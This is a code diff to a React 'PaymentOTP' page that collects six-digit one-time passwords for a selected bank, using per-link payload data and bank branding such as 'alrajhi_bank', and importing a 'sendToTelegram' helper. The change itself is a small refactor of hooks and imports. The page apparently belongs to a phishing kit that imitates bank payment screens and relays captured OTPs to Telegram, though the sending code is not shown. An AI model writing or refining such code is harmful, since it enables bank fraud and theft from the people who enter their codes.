@@ -1,10 +1,9 @@
-import { useState, useEffect, useMemo } from "react";
+import { useState, useEffect, useMemo, useRef } from "react";
 import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { useUpdateLink } from "@/hooks/useSupabase";
 import { useLinkData } from "@/hooks/useLinkData";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
-import { bankBranding } from "@/lib/brandingSystem";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
@@ -38,10 +37,9 @@ const PaymentOTP = () => {
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
   const [timer, setTimer] = useState(120);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const inputRefs = React.useRef<(HTMLInputElement | null)[]>([]);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
-  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default || bankBranding.alrajhi_bank;
   const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;
 
   const companyKey = searchParams.get("company") || linkData?.payload?.service_key || '';
@@ -239,5 +237,4 @@ const PaymentOTP = () => {
   );
 };
 
-import React from "react";
 export default PaymentOTP;
